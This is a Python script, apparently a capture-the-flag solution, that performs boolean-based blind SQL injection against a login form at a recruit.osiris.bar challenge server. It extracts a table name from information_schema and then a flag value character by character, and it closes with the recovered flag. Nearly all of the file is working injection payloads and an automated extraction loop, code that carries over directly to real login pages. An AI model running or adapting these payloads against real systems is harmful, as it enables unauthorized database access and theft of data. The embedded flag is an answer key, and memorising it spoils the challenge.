import requests

url = "http://recruit.osiris.bar:32008/auth/login"

charset = "{}_abcdefghijklmnopqrstuvwxyz0123456789!?@"

def get_table_name_with_flag():
    table_name = ""
    position = 1

    while True:
        found = False
        for char in charset:
            payload = f"' OR (SELECT SUBSTRING((SELECT table_name FROM information_schema.columns WHERE column_name = 'flag' LIMIT 1 OFFSET 2), {position}, 1)) = '{char}'-- "
            data = {"username": payload, "password": "password"}
            response = requests.post(url, data=data)

            if "Welcome" in response.text:
                table_name += char
                print(f"Found so far: {table_name}")
                found = True
                position += 1
                break

        if not found:
            break

    return table_name

table_name = get_table_name_with_flag()

print("Table containing 'flag' column:", table_name)

def get_flag_value():
    flag_value = ""
    position = 1

    while True:
        found = False
        for char in charset:
            payload = f"' OR (SELECT SUBSTRING(flag, {position}, 1) FROM its_in_here LIMIT 1) = '{char}'-- "
            data = {"username": payload, "password": "password"}
            response = requests.post(url, data=data)

            if "Welcome" in response.text:
                flag_value += char
                print(f"Found so far: {flag_value}")
                found = True
                position += 1
                break

        if not found:
            break

    return flag_value

flag = get_flag_value()
print(f"Flag: {flag}")

# flag{0h_8oy_7h@7_wa2_h@rd}
